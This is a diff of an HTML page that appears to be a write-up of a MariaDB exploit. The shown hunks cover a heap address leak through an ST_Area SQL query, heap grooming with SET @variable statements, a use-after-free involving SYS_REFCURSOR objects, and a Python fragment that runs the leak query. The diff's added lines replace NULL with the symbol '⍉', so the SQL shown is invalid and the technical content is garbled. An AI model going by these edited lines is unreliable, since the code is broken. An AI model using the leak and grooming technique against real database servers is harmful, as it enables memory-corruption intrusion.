@@ -133,7 +133,7 @@
 
       <div class='mdb-image-cont'>
       <pre><code>[!] leaking payload
-  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#0550ae;">SQL ▶</span> SELECT ST_Area(a) FROM lk WHERE b IS NOT NULL AND c IS NOT NULL
+  <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#0550ae;">SQL ▶</span> SELECT ST_Area(a) FROM lk WHERE b IS NOT ⍉ AND c IS NOT ⍉
   <span style="font-weight:bold;"></span><span style="font-weight:bold;color:#116329;">SQL ◀</span> 1 row(s): (3.240693733576871e-10,)
 leaked address: 0x774fd3fe7738</code></pre>
       <i>Successful leak (MariaDB client view).</i>
@@ -212,7 +212,7 @@ leaked address: 0x774fd3fe7738</code></pre>
 
       <p>However, we still do not have a suitable target here. We can theoretically perform our leaks, but we do not have a chunk in mind that we can use to perform the PIE leak. Recall our constraints on this target chunk: we need to be able to control the data prior to the PIE pointer exactly, and we need to be able to allocate it easily. This will be detailed in the following section.</p>
 
-      <p>A small bit of housekeeping before any of that, though: MariaDB is actually quite lax when it comes to heap grooming. There is a very useful query <span class='monospace'>SET @... = [blah]</span> that allows us to store arbitrarily sized data as some global variable, and this all gets stored in differently sized chunks in the heap. We can control the exact size of these allocations, and we can even free the chunks by simply doing <span class='monospace'>SET @... = NULL</span>. This will be very useful later on.</p>
+      <p>A small bit of housekeeping before any of that, though: MariaDB is actually quite lax when it comes to heap grooming. There is a very useful query <span class='monospace'>SET @... = [blah]</span> that allows us to store arbitrarily sized data as some global variable, and this all gets stored in differently sized chunks in the heap. We can control the exact size of these allocations, and we can even free the chunks by simply doing <span class='monospace'>SET @... = ⍉</span>. This will be very useful later on.</p>
 
       <h2>Second bug -- UAF with SYS_REFCURSOR objects</h2>
 
@@ -355,7 +355,7 @@ recovered 94218643904184 0x55b0fccd16b8
 </span><span style="color:#6e7781;">    6   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    5   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#6e7781;">│</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    4   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   </span><span style="color:#0550ae;">input</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">'[!] leaking payload'</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
-</span><span style="color:#6e7781;">    3   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;SELECT ST_Area(a) FROM lk WHERE b IS NOT NULL AND c IS NOT NULL&quot;</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
+</span><span style="color:#6e7781;">    3   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">execute</span><span style="color:#0550ae;">(</span><span style="color:#0a3069;">&quot;SELECT ST_Area(a) FROM lk WHERE b IS NOT ⍉ AND c IS NOT ⍉&quot;</span><span style="color:#0550ae;">)</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    2   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   r </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> cy</span><span style="color:#0550ae;">.</span><span style="color:#6639ba;">fetchone</span><span style="color:#0550ae;">()</span><span style="color:#1f2328;">
 </span><span style="color:#6e7781;">    1   </span><span style="color:#0550ae;">│</span><span style="color:#1f2328;">   payload_address </span><span style="color:#0550ae;">=</span><span style="color:#1f2328;"> </span><span style="color:#6639ba;">_recover</span><span style="color:#0550ae;">(</span><span style="color:#1f2328;">r</span><span style="color:#0550ae;">[</span><span style="color:#0550ae;">0</span><span style="color:#0550ae;">])</span><span style="color:#1f2328;"></span></code></pre>
 
